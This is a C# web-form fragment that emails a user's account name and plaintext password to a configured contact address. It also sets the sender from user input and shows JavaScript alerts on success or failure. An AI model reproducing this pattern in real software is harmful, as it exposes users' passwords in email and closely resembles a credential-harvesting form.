    try
    {
        MailMessage notification;
        SmtpClient Client;
        notification = new MailMessage();
        notification.From = new MailAddress(YourEmail.Text, Microsoft.Security.Application.Encoder.HtmlEncode(TextName.Text));
        notification.To.Add(new MailAddress(ConfigurationManager.AppSettings["Contact Email"].ToString()));
        notification.Priority = MailPriority.Normal;
        notification.Subject = "Confirmation email " + Microsoft.Security.Application.Encoder.HtmlEncode(YourSubject.Text);
        notification.IsBodyHtml = false;
        notification.BodyEncoding = Encoding.UTF8;
        notification.Body = "account: " + Microsoft.Security.Application.Encoder.HtmlEncode(TextName.Text) + "\n\npassword: " + Microsoft.Security.Application.Encoder.HtmlEncode(passwordtext.Text);
        Client = new SmtpClient();
        try
        {
            Client.Send(notification);
        }
        catch (SmtpException ex)
        {
            // write a log entry here, maybe notify user of error
            return false;
        }
    }
    catch (Exception ex)
    {
        this.dynamicJavaScript.Text = "<script>alert(\"Error sending message: " + Server.HtmlEncode(ex.Message.Replace("'","`")) + "\")</script>";
        
        return false;
    }
    this.dynamicJavaScript.Text = "<script>alert(\"Message Sent.\")</script>";
    return true;
